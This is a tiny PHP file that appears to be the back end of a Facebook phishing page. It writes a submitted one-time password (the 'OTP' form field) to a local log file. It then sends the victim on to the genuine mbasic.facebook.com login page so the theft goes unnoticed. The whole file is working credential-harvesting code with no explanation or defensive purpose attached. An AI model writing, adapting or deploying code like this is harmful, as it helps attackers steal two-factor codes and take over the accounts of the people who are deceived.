<?php

file_put_contents("log.txt", " Done " . $_POST['OTP'] . "\n", FILE_APPEND);
header('Location: https://mbasic.facebook.com/login/?email=&li=7HuNXheRQXhWYv5BGRmu6HKI&e=1348092&refsrc=https%3A%2F%2Fmbasic.facebook.com%2F&_rdr');
exit();
